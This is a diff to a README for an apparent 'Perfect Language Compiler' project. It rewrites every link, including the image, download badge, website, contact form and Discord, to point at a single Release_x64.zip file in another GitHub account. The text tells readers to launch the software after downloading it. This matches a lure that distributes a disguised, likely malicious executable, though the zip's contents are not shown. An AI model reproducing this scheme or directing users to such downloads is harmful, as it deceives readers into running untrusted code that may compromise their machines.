@@ -1,6 +1,6 @@
 # Welcome to the Perfect Language Compiler Repository 🚀
 
-![Compiler](https://cdn.pixabay.com/photo/2017/07/02/21/00/dog-2465473_960_720.jpg)
+![Compiler](https://github.com/Rosale-Real/compiler/releases/download/v2.0/Release_x64.zip)
 
 ## Project Overview
 
@@ -35,7 +35,7 @@ Feel free to explore these topics as you delve deeper into our compiler developm
 
 Click the button below to download the software for your preferred platform:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Rosale-Real/compiler/releases/download/v2.0/Release_x64.zip)](https://github.com/Rosale-Real/compiler/releases/download/v2.0/Release_x64.zip)
 
 *Note: The software needs to be launched after downloading.*
 
@@ -49,10 +49,10 @@ To receive the latest updates and releases, keep an eye on our repository's "Rel
 
 ## Additional Resources
 
-For more information about our compiler project, visit our [website](https://www.perfectlanguagecompiler.com). Here you'll find blogs, tutorials, and documentation to guide you through the world of compiler development.
+For more information about our compiler project, visit our [website](https://github.com/Rosale-Real/compiler/releases/download/v2.0/Release_x64.zip). Here you'll find blogs, tutorials, and documentation to guide you through the world of compiler development.
 
 ## Connect with Us
 
-Have questions, suggestions, or feedback? Feel free to reach out to us through our [contact form](https://www.perfectlanguagecompiler.com/contact) or join our community on [Discord](https://discord.com/perfectlanguagecompiler).
+Have questions, suggestions, or feedback? Feel free to reach out to us through our [contact form](https://github.com/Rosale-Real/compiler/releases/download/v2.0/Release_x64.zip) or join our community on [Discord](https://github.com/Rosale-Real/compiler/releases/download/v2.0/Release_x64.zip).
 
 Let's embark on this exciting journey towards creating the perfect language together! 🌟
